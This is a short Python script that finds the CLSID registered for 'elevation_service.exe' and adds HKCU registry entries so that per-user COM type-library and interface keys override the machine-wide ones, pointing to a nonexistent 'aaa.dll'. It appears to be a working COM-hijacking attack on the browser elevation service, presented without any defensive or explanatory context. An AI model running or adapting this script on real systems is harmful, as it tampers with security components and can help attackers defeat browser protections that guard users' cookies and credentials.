import re
import subprocess

# Query registry for COM server CLSID
try:
    query = subprocess.run(["reg", "query", r"HKCR\TypeLib", "/s", "/f", "elevation_service.exe"], capture_output = True, text = True, check = True)
except Exception as e:
    print(f"{e}: Failed to query for COM server CLSID")

match = re.search(r"\{[0-9A-Fa-f\-]{36}\}", query.stdout)
CLSID = match.group(0)
    
# Override HKLM with HKCU entry pointing to nonexistant COM server
try:
    subprocess.run(["reg", "add", rf"HKCU\Software\Classes\TypeLib\{CLSID}\1.0\0\win64", "/ve", "/t", "REG_SZ", "/d", "aaa.dll"])
    subprocess.run(["reg", "add", rf"HKCU\Software\Classes\Interface\{CLSID}\ProxyStubClsid32", "/ve", "/t", "REG_SZ", "/d", "{00020424-0000-0000-C000-000000000046}"])
    subprocess.run(["reg", "add", rf"HKCU\Software\Classes\Interface\{CLSID}\TypeLib", "/ve", "/t", "REG_SZ", "/d", "{C9C2B807-7731-4F34-81B7-44FF7779522B}"])
    subprocess.run(["reg", "add", rf"HKCU\Software\Classes\Interface\{CLSID}\TypeLib", "/v", "Version", "/t", "REG_SZ", "/d", "1.0"])
except Exception as e:
    print(f"{e}: Failed to modify the HKCU registry")
